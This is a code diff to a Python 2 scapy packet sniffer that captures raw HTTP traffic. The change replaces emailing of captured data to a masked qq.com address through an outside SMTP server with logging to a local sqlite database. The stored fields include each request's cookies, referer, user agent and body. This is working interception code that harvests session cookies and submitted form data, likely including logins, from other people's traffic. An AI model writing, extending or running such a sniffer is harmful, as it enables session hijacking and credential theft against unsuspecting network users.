@@ -5,6 +5,7 @@
 from email.mime.text import MIMEText
 from scapy.all import *
 import smtplib
+import sqlite3
 import os
 import sys
 
@@ -12,12 +13,49 @@ def dealPackage(packet):
 
 	lines = packet.sprintf("{Raw:%Raw.load%}").replace("'","").split(r"\r\n")
 
+	# saveToDB(lines)
+
 	if len(lines[-1]) > 1 and len(lines) > 1:
 		print '-'*90
 		# reciver,title,body
-		sendMail('***@qq.com','Notice ! Found Data!','<br>'.join(lines))
-		for line in lines:
+		# sendMail('***@qq.com','Notice ! Found Data!','<br>'.join(lines))
+		saveToDB(lines)
+
+def saveToDB(data):
+
+	this_url = ''
+	this_cookies = ''
+	this_data = ''
+	this_referer = ''
+	this_ua = ''
+	this_type = ''
+
+	try:
+		cx = sqlite3.connect(sys.path[0]+"/httplog.db")
+		cx.text_factory = str
+		cu = cx.cursor()
+		for line in data[0:-1]:
+			if 'Host:' in line:
+				this_url = line.split('Host:')[1]
+			if 'Referer:' in line:
+				this_referer = line.split('Referer:')[1]
+			if 'User-Agent:' in line:
+				this_ua = line.split('User-Agent:')[1]
+			if 'Cookie:' in line:
+				this_cookies = line.split('Cookie:')[1]
+
 			print line
+
+		this_type = data[0].split(' ')[0]
+		this_url = this_url + data[0].split(' ')[1]
+		this_data = data[-1]
+		cu.execute("insert into record (url,reqType,cookies,referer,data,ua) values (?,?,?,?,?,?)", (this_url,this_type,this_cookies,this_referer,this_data,this_ua))
+		cx.commit()
+		print '[√] Insert successly!'
+		cu.close()
+		cx.close()
+	except Exception, e:
+		print e
 
 def sendMail(receiver, title, body):
 	host = 'smtp.126.com'
@@ -47,4 +85,4 @@ def doSniffer():
 		sys.exit('[x] Can not do sniff on %s! Please check! Exception is %s' % (sniff_iface,e))
 
 if __name__ == '__main__':
-    doSniffer()
+	doSniffer()
